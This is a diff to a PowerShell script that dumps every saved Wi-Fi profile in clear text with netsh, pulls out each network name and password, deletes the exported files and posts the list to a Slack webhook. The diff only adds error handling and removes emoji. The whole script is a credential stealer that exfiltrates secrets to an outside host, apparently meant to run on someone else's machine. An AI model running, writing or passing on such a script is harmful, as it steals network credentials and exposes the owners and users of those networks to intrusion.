@@ -7,17 +7,21 @@ New-Item -ItemType Directory -Path $TempDir -Force | Out-Null
 Set-Location $TempDir
 
 # Export all Wi-Fi profiles to XML files
-netsh wlan export profile key=clear | Out-Null
+netsh wlan export profile key=clear
 
 # Parse the XML files and create a message string
-$Message = "📶 Saved Wi-Fi Passwords:`n`n"
+$Message = "Saved Wi-Fi Passwords:`n`n"
 
 Get-ChildItem -Path "*.xml" | ForEach-Object {
-    $XmlData = [xml](Get-Content $_.FullName)
-    $SSID = $XmlData.WLANProfile.SSIDConfig.SSID.Name
-    $Password = $XmlData.WLANProfile.MSM.Security.SharedKey.KeyMaterial
-    $Message += "🔹 *SSID:* $SSID`n"
-    $Message += "🔸 *Password:* $Password`n`n"
+    try {
+        $XmlData = [xml](Get-Content $_.FullName)
+        $SSID = $XmlData.WLANProfile.SSIDConfig.SSID.Name
+        $Password = $XmlData.WLANProfile.MSM.Security.SharedKey.KeyMaterial
+        $Message += "SSID: $SSID`n"
+        $Message += "Password: $Password`n`n"
+    } catch {
+        # Skip invalid XML files
+    }
     Remove-Item $_.FullName
 }
 
@@ -28,9 +32,9 @@ $Body = @{
 
 # Send the message to Slack
 try {
-    Invoke-RestMethod -Uri $SlackWebhookUrl -Method Post -Body $Body -ContentType 'application/json' | Out-Null
+    Invoke-RestMethod -Uri $SlackWebhookUrl -Method Post -Body $Body -ContentType 'application/json'
 } catch {
-    # Error handling
+    # Error handling - you can add logging here if needed
 }
 
 # Cleanup
